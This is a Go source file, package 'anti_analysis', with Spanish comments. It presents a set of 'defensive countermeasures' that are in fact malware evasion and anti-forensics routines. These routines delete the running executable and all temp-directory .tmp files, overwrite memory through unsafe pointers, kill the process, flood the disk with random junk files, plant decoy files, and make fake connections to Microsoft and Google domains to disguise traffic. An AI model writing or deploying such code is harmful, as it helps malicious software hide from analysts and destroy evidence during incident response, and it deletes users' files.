package anti_analysis

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"math"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"
)

// DefensiveMeasures implementa técnicas avanzadas de protección
type DefensiveMeasures struct {
	artifactPaths []string
	decoyFiles    []string
}

func NewDefensiveMeasures() *DefensiveMeasures {
	return &DefensiveMeasures{
		artifactPaths: []string{
			os.Args[0],                           // Ejecutable actual
			filepath.Join(os.TempDir(), "*.tmp"), // Archivos temporales
		},
		decoyFiles: []string{
			"config.xml",
			"data.bin",
			"logs.txt",
		},
	}
}

func (dm *DefensiveMeasures) Activate() {
	log.Println("[!] Activando contramedidas defensivas")

	// Ejecutar en orden de prioridad
	dm.executeDecoyBehavior()
	dm.cleanArtifacts()
	dm.selfDestruct()
	dm.floodWithJunkData()
	// dm.triggerAntiForensics()
}

func (dm *DefensiveMeasures) executeDecoyBehavior() {
	// Comportamiento engañoso
	log.Println("[*] Ejecutando comportamiento benigno de engaño")

	// 1. Generar actividad de red falsa
	go dm.fakeNetworkActivity()

	// 2. Crear archivos señuelo
	for _, file := range dm.decoyFiles {
		dm.createDecoyFile(file)
	}

	// 3. Ejecutar código basura para confundir
	dm.executeJunkCode()
}

func (dm *DefensiveMeasures) cleanArtifacts() {
	log.Println("[*] Limpiando artefactos")

	// Eliminar archivos sensibles
	for _, pattern := range dm.artifactPaths {
		files, _ := filepath.Glob(pattern)
		for _, f := range files {
			for i := 0; i < 3; i++ { // Intentar hasta 3 veces
				if err := os.Remove(f); err == nil {
					break
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
	}

	// Sobrescribir memoria sensible
	dm.overwriteSensitiveMemory()
}

func (dm *DefensiveMeasures) selfDestruct() {
	log.Println("[*] Auto-destrucción iniciada")

	// Método 1: Eliminar ejecutable
	exe, _ := os.Executable()
	os.Remove(exe)

	// Método 2: Terminar proceso
	pid := os.Getpid()
	proc, _ := os.FindProcess(pid)
	proc.Kill()

	// Método 3: Crash controlado
	// dm.forceCrash()
}

func (dm *DefensiveMeasures) floodWithJunkData() {
	// Llenar disco/memoria con datos basura
	log.Println("[*] Generando datos basura para interferencia")

	go func() {
		for i := 0; i < 10; i++ {
			path := fmt.Sprintf("%s\\junk%d.dat", os.TempDir(), i)
			dm.generateJunkFile(path, 10*1024*1024) // 10MB
		}
	}()
}

// ===== Técnicas Avanzadas =====

func (dm *DefensiveMeasures) overwriteSensitiveMemory() {
	// Sobrescribir zonas de memoria críticas
	addr := unsafe.Pointer(&dm)
	size := unsafe.Sizeof(dm)
	junk := make([]byte, int(size))
	rand.Read(junk)

	copy((*[1 << 30]byte)(addr)[:size], junk)
}

func (dm *DefensiveMeasures) generateJunkFile(path string, size int64) {
	file, _ := os.Create(path)
	defer file.Close()

	// Llenar con datos aleatorios
	_, _ = io.CopyN(file, rand.Reader, size)
}

func (dm *DefensiveMeasures) executeJunkCode() {
	// Ejecutar código sin sentido para confundir análisis
	for i := 0; i < 1000; i++ {
		// Operaciones matemáticas inútiles
		_ = math.Sqrt(float64(i))
		_ = math.Pow(float64(i), 2)

		// Manipulación de strings sin sentido
		s := fmt.Sprintf("junk%d", i)
		_ = strings.ToUpper(s)
		_ = strings.Repeat(s, 3)

		// Operaciones de memoria
		buf := make([]byte, 1024)
		rand.Read(buf)
		_ = sha256.Sum256(buf)
	}
}

func (dm *DefensiveMeasures) fakeNetworkActivity() {
	// Intentar conexiones a dominios legítimos
	domains := []string{
		"www.microsoft.com",
		"www.google.com",
		"update.windows.com",
	}

	for _, domain := range domains {
		conn, err := net.Dial("tcp", domain+":80")
		if err == nil {
			fmt.Fprintf(conn, "GET / HTTP/1.0\r\n\r\n")
			conn.Close()
		}
	}
}

func (dm *DefensiveMeasures) createDecoyFile(name string) {
	content := []string{
		"<?xml version=\"1.0\"?>",
		"<configuration>",
		"  <appSettings>",
		"    <add key=\"debug\" value=\"false\"/>",
		"  </appSettings>",
		"</configuration>",
	}

	path := filepath.Join(os.TempDir(), name)
	os.WriteFile(path, []byte(strings.Join(content, "\n")), 0644)
}

func (dm *DefensiveMeasures) forceCrash() {
	// Provocar un crash controlado
	defer func() { recover() }()
	var nilPtr *int
	*nilPtr = 0 // Dereferenciación de nil
}
